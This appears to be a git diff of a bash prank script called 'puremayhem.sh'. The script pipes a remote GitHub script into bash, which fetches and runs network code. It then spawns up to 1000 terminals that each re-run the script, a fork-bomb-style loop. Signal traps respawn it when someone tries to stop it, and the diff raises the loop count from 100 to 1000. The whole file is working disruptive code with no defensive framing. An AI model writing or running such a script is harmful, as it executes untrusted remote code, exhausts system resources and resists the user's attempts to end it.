@@ -1,10 +1,12 @@
 
 #!/bin/bash
 # puremayhem.sh
-killall Dock
+# killall Dock
+
 curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash
-for ((x = 0; x<100; x++)); 
+for ((x = 0; x<1000; x++)); 
 do
-        start cmd.exe/k sh "~/Desktop/puremayhem.sh"
-        trap "curl parrot.live" SIGINT SIGTERM
+        gnome-terminal -- bash puremayhem.sh
+        #bash ./$0
+        trap "gnome-terminal -- bash puremayhem.sh" SIGINT SIGTERM SIGKILL
 done
